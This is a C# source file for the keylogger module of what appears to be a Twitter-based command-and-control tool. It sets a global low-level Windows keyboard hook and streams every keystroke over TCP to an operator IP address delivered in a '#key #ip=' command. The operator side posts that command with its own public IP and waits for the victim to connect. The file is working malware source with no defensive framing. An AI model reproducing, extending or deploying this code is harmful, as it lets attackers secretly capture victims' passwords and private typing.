using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using TwitterCommandAndControl.Core;

namespace TwitterCommandAndControl.Handlers
{
    public class KeyLoggerHandler : Handler
    {
        private const int SW_HIDE = 0;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr hookID = IntPtr.Zero;

        private KeyLoggerHandler() : base() { }

        public static void Respond(string command)
        {
            NetworkStream networkStream = null;

            command = command.ToLower();
            if (command.Contains("#key"))
            {
                var ip = command.Split('#').Where(x => x.StartsWith("ip=")).Select(x => x.Split('=')[1]).FirstOrDefault();
                try
                {
                    using (var tcpClient = new TcpClient())
                    {
                        tcpClient.Connect(ip, PORT);
                        using (networkStream = tcpClient.GetStream())
                        using (var writer = new StreamWriter(networkStream))
                        {
                            networkStream.WriteTimeout = 500;

                            LowLevelKeyboardProc hook = (nCode, wParam, lParam) =>
                            {
                                try
                                {
                                    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                                    {
                                        int vkCode = Marshal.ReadInt32(lParam);
                                        if(Control.IsKeyLocked(Keys.CapsLock) ^ (Control.ModifierKeys == Keys.Shift))
                                            writer.WriteLine(((Keys)vkCode).ToString().ToUpper());
                                        else
                                            writer.WriteLine(((Keys)vkCode).ToString().ToLower());
                                        writer.Flush();
                                    }
                                }
                                catch { tcpClient.Close(); }
                                return CallNextHookEx(hookID, nCode, wParam, lParam);
                            };

                            hookID = SetHook(hook);
                            Application.Run();
                            try
                            {
                                while (tcpClient.Connected)
                                {
                                    Thread.Sleep(1000 / 60);
                                }
                            }
                            catch { }
                            finally
                            {
                                UnhookWindowsHookEx(hookID);
                            }
                        }
                    }
                }
                catch { }
            }
        }

        public static TcpClient Request(string commandPrefix)
        {
            var listenerTask = NextClient();
            Messenger.Send(commandPrefix + " #key #ip=" + GetPublicIP.GetIP());
            listenerTask.Wait();
            return listenerTask.Result;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        #region DllImports
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        #endregion
    }
}
